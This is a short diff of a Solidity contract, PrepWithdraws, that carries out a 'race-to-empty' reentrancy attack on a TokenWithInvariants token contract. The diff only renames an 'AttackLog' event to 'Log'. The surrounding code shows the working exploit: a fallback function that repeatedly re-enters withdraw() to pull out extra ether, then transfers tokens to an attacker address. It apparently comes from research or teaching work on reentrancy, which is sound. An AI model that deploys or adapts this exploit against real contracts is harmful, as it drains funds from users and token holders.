@@ -27,7 +27,7 @@ contract TWIProxy {
  * from the RaceToEmpty contract
  */
 contract PrepWithdraws {
-  event AttackLog(string msg, uint value);
+  event Log(string msg, uint value);
   /* It's important that performAttack is initially false so
    * that we can give ether to this contract to deposit into
    * TokenWithInvariants contract without invoking logic of
@@ -57,11 +57,11 @@ contract PrepWithdraws {
   function() {
     if (performAttack) {
       depth = depth + 1;
-      AttackLog("value", (uint)(this.balance/conversion));
+      Log("value:", (uint)(this.balance/conversion));
       if (depth < numExtraWithdraws) {  /* attack again */
         twi.withdraw();
       } else {
-        AttackLog("Transferring tokens", 99);
+        Log("Transferring tokens", numTokens);
         twi.transfer.value(numExtraWithdraws*tokensInWei)(raceToEmptyAddress,numTokens);
         performAttack = false; /* turn off attack again*/
       }
